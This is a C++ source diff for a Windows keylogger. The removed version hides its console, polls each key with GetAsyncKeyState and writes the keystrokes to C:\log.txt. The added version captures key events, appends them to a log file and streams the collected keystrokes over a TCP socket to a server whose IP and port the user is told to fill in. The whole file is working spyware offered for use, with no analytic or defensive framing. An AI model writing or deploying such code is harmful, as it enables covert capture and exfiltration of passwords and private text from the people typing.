@@ -1,218 +1,99 @@
-#include <windows.h>
-#include <iostream>        
-#include <fstream>         
+#include <iostream>
+#include <fstream>
 #include <string>
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <stdio.h>
 
 using namespace std;
 
+// IP address and port of socket server
+const string SERVER_IP = "127.0.0.1";  // Put your server IP here
+const int SERVER_PORT = 12345;         // Put your server port here
+
 int main() {
-    FreeConsole();   
-     
-    string keys;    
- 
-    while(1==1) {  
-      if(GetAsyncKeyState(0x41)) {      
-           cout << "a";                
-           keys+= "a";    
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x42)) {
-           cout << "b";
-           keys+= "b";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x43)) {
-           cout << "c";
-           keys+= "c";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x44)) {
-           cout<<"d";
-           keys+="d";
-           Sleep(200);                      
-      }; 
-      if(GetAsyncKeyState(0x45)) {
-           cout<<"e";
-           keys+="e";
-           Sleep(200);                      
-      };      
-     
-      if(GetAsyncKeyState(0x46)) {
-           cout<<"f";
-           keys+="f";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x47)) {
-           cout<<"g";
-           keys+="g";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x48)) {
-           cout<<"h";
-           keys+="h";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x49)) {
-           cout<<"i";
-           keys+="i";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x4a)) {
-           cout<<"j";
-           keys+="j";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x4b)) {
-           cout<<"k";
-           keys+="k";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x4c)) {
-           cout<<"l";
-           keys+="l";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x4d)) {
-           cout<<"m";
-           keys+="m";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x4e)) {
-           cout<<"n";
-           keys+="n";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x4f)) {
-           cout<<"o";
-           keys+="o";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x50)) {
-           cout<<"p";
-           keys+="p";
-           Sleep(200);                      
-      }; 
-      if(GetAsyncKeyState(0x51)) {
-           cout<<"q";
-           keys+="q";
-           Sleep(200);                      
-      };  
-      if(GetAsyncKeyState(0x52)) {
-           cout<<"r";
-           keys+="r";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x53)) {
-           cout<<"s";
-           keys+="s";
-           Sleep(200);                      
-      };  
-      if(GetAsyncKeyState(0x54)) {
-           cout<<"t";
-           keys+="t";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x55)) {
-           cout<<"u";
-           keys+="u";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x56)) {
-           cout<<"v";
-           keys+="v";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x57)) {
-           cout<<"w";
-           keys+="w";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x58)) {
-           cout<<"x";
-           keys+="x";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x59)) {
-           cout<<"y";
-           keys+="y";
-           Sleep(200);                      
-      };      
-      if(GetAsyncKeyState(0x5A)) {
-           cout<<"z";
-           keys+="z";
-           Sleep(200);                      
-      }; 
-      if(GetAsyncKeyState(VK_SPACE)) {
-           cout<<" ";
-           keys+=" ";
-           Sleep(200);                      
-      }; 
-      if(GetAsyncKeyState(0x6E)) {
-           cout<<".";
-           keys+=".";
-           Sleep(200);                      
-      }; 
-      if(GetAsyncKeyState(0x0d)) {
-           cout<<"/n";
-           keys+="<br>";
-           Sleep(200);
-      };
-      if(GetAsyncKeyState(0x30)) {
-           cout<<"0";
-           keys+="0";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x31)) {
-           cout<<"1";
-           keys+="1";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x32)) {
-           cout<<"2";
-           keys+="2";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x33)) {
-           cout<<"3";
-           keys+="3";
-           Sleep(200);                      
-      };       
-      if(GetAsyncKeyState(0x34)) {
-           cout<<"4";
-           keys+="4";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x35)) {
-           cout<<"5";
-           keys+="5";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x36)) {
-           cout<<"6";
-           keys+="6";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x37)) {
-           cout<<"7";
-           keys+="7";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x38)) {
-           cout<<"8";
-           keys+="8";
-           Sleep(200);                      
-      };
-      if(GetAsyncKeyState(0x39)) {
-           cout<<"9";
-           keys+="9";
-           Sleep(200);                      
-      };
-      
+    string keys;
+    HANDLE keyboardHandle = GetStdHandle(STD_INPUT_HANDLE);
 
-  ofstream myfile;      
-  myfile.open ("C:\\log.txt");       
-  myfile << keys;                        
-  myfile.close();                         
+    // Set console mode to receive keyboard events
+    DWORD consoleMode;
+    GetConsoleMode(keyboardHandle, &consoleMode);
+    SetConsoleMode(keyboardHandle, ENABLE_EXTENDED_FLAGS | ENABLE_WINDOW_INPUT | ENABLE_MOUSE_INPUT);
 
-	};
+    // Initializing Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        cout << "Erro ao inicializar o Winsock." << endl;
+        return 1;
+    }
+
+    // Create socket
+    SOCKET socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_fd == INVALID_SOCKET) {
+        cout << "Erro ao criar o socket." << endl;
+        WSACleanup();
+        return 1;
+    }
+
+    // Set up server address
+    sockaddr_in serverAddr{};
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(SERVER_PORT);
+    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
+        cout << "Endereço IP inválido." << endl;
+        closesocket(socket_fd);
+        WSACleanup();
+        return 1;
+    }
+
+    // Connect to server
+    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        cout << "Erro ao conectar ao servidor." << endl;
+        closesocket(socket_fd);
+        WSACleanup();
+        return 1;
+    }
+
+    while (true) {
+        INPUT_RECORD inputRecord;
+        DWORD eventsRead;
+        ReadConsoleInput(keyboardHandle, &inputRecord, 1, &eventsRead);
+
+        if (inputRecord.EventType == KEY_EVENT && inputRecord.Event.KeyEvent.bKeyDown) {
+            WORD keyCode = inputRecord.Event.KeyEvent.wVirtualKeyCode;
+            if (keyCode == VK_RETURN) {
+                cout << "<br>";
+                keys += "<br>";
+            } else if (keyCode == VK_SPACE) {
+                cout << " ";
+                keys += " ";
+            } else if (keyCode == VK_OEM_PERIOD) {
+                cout << ".";
+                keys += ".";
+            } else if (keyCode >= 'A' && keyCode <= 'Z') {
+                cout << static_cast<char>(keyCode);
+                keys += static_cast<char>(keyCode);
+            }
+
+            ofstream myfile;
+            myfile.open("C:\\Users\\user\\log.txt", ios::app);  // Replace "C:\\Users\\user\\log.txt" with your desired path and file name
+            myfile << keys;
+            myfile.close();
+
+            // Send data to server
+            if (send(socket_fd, keys.c_str(), keys.length(), 0) == SOCKET_ERROR) {
+                cout << "Erro ao enviar os dados para o servidor." << endl;
+                closesocket(socket_fd);
+                WSACleanup();
+                return 1;
+            }
+        }
+    }
+
+    // Cleanup
+    closesocket(socket_fd);
+    WSACleanup();
+    return 0;
 }
